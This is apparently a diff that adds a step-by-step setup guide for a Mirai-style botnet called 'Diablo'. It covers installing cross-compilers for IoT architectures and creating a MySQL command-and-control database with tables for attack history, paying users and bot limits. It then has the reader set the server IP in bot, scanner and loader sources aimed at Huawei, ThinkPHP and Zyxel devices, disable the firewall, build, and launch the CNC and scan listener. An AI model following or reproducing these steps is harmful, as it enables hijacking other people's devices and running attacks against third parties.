@@ -1,0 +1,164 @@
+===============[Compilers & Other Important Shit]===============
+===============[    Copy Everything At Once     ]===============
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+
+mkdir /etc/xcompile
+cd /etc/xcompile 
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+rm -rf *.tar.bz2
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+
+cd /tmp
+wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
+tar -xzf go1.9.4.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+===============[MYSQL Installation For Centos 7 (If Above Doesnt Work)]===============
+===============[              Copy One And Paste One By One           ]===============
+
+wget https://dev.mysql.com/get/mysql57-community-release-el7-9.noarch.rpm
+sudo rpm -ivh mysql57-community-release-el7-9.noarch.rpm
+sudo yum install mysql-server
+sudo systemctl start mysqld
+sudo systemctl status mysqld
+sudo grep 'temporary password' /var/log/mysqld.log (Copy The Temp Password)
+sudo mysql_secure_installation (Use The Temp Pass For Password, Enter a new 12-character password that contains at least one uppercase letter, one lowercase letter, one number and one special character) 
+===============[                      MYSQL Shit                      ]===============
+
+mysql -u root -p (Enter your password when prompted)
+use mysql
+GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'root';
+FLUSH PRIVILEGES;
+
+(Paste The Below All At Once, Put your data base name where "database_name" is)
+
+CREATE DATABASE Diablo;
+use Diablo;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'Username', 'Password', 0, 0, 0, 0, -1, 1, 30, '');
+
+CREATE TABLE `logins` (
+  `id` int(11) NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `action` varchar(32) NOT NULL,
+  `ip` varchar(15) NOT NULL,
+  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+exit;
+
+(Change "username" and "password" to whatever you want as your botnet login)
+(Change the password to the database in the source (cnc\main.go) to the password for mysql on the vps)
+
+===============[                        Change IPs                        ]===============
+
+(Press ctrl + F and find 0.0.0.0 and change it to your vps ip)
+bot\huawei.c
+bot\includes.h  
+bot\thinkphp.c
+bot\zyxel_scanner.c
+cnc\main.go (DO NOT CHANGE ANY PORTS - UNLESS YOU KNOW WHAT YOURE DOING)
+dlr\main.c (change the 0,0,0,0 to your ip and put , instead of .)
+loader\src\main.c
+scanLiten.go (DO NOT CHANGE ANY PORTS - UNLESS YOU KNOW WHAT YOURE DOING) 
+
+===============[                      Compiling Shit                      ]===============
+
+(Paste one by one)
+(Make Sure You Changed All The Necessary IPs In Your Source)
+(Usually Itll Be The Following: thinkphp.c,includes.h,main.go,dlr/main.c,loader/src/main.c,scanshit.go)
+
+service iptables stop; service httpd restart; service mysqld restart
+
+cd ~/; chmod 0777 * -R; sh build.sh
+
+iptables -F; screen ./cnc
+
+cd loader
+
+screen ./scanListen
+
+cd
+
+python DiabloV1.py; service httpd restart
+
+(Now Youre Done Enjoy!)
+
+
+
+
+
